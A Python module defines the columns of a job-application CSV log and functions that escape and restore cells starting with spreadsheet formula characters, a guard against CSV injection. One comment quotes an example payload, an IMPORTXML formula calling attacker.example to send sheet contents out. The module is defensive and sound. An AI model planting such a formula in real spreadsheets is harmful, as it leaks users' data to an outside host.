"""Column names and cell encoding for application CSVs."""

APPLIED_COLUMNS = [
    'applied_at',
    'status',
    'source',
    'id',
    'title',
    'company',
    'location',
    'salary',
    'salary_annual_low',
    'salary_annual_high',
    'currency',
    'experience_min',
    'experience_max',
    'posted',
    'url',
    'flags',
    'note',
]


# A spreadsheet runs any cell starting with one of these as a formula, and the
# log is full of text scraped from job boards: a posting titled
# =IMPORTXML("https://attacker.example/?"&A1, ...) would run on import and could
# send the sheet's contents away. From OWASP's CSV Injection page, including the
# full-width forms some locales also treat as formula starts.
FORMULA_START = ('=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠')
ESCAPE = "'"


def _escaped(value: str) -> bool:
    """Whether neutralise() quotes this: a formula start - or a quote before
    one, so restore() never strips a quote that was really there."""
    return value.startswith(FORMULA_START) or (
        value.startswith(ESCAPE) and value[1:].startswith(FORMULA_START)
    )


def neutralise(value):
    """'=1+2' -> "'=1+2": read as text, not run as a formula. Other values pass
    through - including numbers, so a negative figure stays a number. "'=1"
    becomes "''=1", which reads back - and shows in a spreadsheet - as "'=1"."""
    if isinstance(value, str) and _escaped(value):
        return ESCAPE + value
    return value


def restore(value):
    """Undo neutralise(), so the log reads back as the data that went in."""
    if isinstance(value, str) and value.startswith(ESCAPE) and _escaped(value[1:]):
        return value[1:]
    return value
